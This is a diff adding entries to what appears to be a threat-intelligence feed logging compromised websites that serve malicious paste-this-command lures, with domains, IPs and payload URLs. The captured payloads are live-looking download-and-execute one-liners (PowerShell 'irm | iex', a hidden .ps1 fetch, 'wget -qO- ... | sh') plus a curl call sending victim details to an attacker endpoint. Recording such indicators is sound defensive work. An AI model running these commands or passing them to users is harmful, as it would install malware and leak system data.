@@ -1,5 +1,98 @@
 [
   {
+    "UrlDomain": "alejandrokhan.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "212.227.141.210"
+    ],
+    "Related": [],
+    "Payload": "powershell -ExecutionPolicy Bypass \"curl.exe -s -o $env:temp\\39310.ps1 523997074/39310;& $env:temp\\39310.ps1\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwrgoo132k5d0omlhxw2x1bw",
+    "ScannedAt": "2026-11-22T06:34:16.143000+00:00"
+  },
+  {
+    "UrlDomain": "mcovenantacademy.net",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.217.18"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/53ae2645eac6a23f",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=65eea44dce7b9e74c17103bbf62b607d942446563bf06f36",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/53ae2645eac6a23f'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/53ae2645eac6a23f"
+    ],
+    "ReportId": "cmwrgnlfo2k4c0omlo06v7ukp",
+    "ScannedAt": "2026-11-22T06:33:26.041000+00:00"
+  },
+  {
+    "UrlDomain": "jewelsthecelebrant.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info",
+      "script.google.com",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script-six-tawny.vercel.app/mac",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec"
+    ],
+    "IP": [
+      "192.254.239.245"
+    ],
+    "Related": [
+      {
+        "Value": "https://script.google.com/cf.js",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "curl -sL -d \"id=828944bd-1f28-4c77-9cbc-9cc3f9894257&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fjewelsthecelebrant[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T06%3A20%3A16.169Z&lastShellAt=2026-11-22T06%3A20%3A16.169Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwrg8f572jhm0oml1i1cdbji",
+    "ScannedAt": "2026-11-22T06:21:38.179000+00:00"
+  },
+  {
+    "UrlDomain": "alomaglow.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info",
+      "script.google.com",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "141.193.213.10"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=a29e020e-8086-463b-8bb6-a7daaf24e3c2&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falomaglow[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T06%3A10%3A29.130Z&lastShellAt=2026-11-22T06%3A10%3A29.130Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwrfvujw2j350omlr7lq12wu",
+    "ScannedAt": "2026-11-22T06:11:51.571000+00:00"
+  },
+  {
     "UrlDomain": "folmars.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
